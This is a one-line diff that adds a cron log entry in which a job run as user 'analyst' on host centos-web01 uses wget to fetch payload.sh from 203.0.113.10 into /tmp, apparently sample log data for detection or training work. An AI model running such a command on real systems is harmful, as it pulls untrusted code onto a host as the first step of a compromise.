@@ -1,0 +1,1 @@
+Nov 25 03:00:01 centos-web01 CROND: (analyst) CMD (wget -q http://203.0.113.10/payload.sh -O /tmp/p.sh)
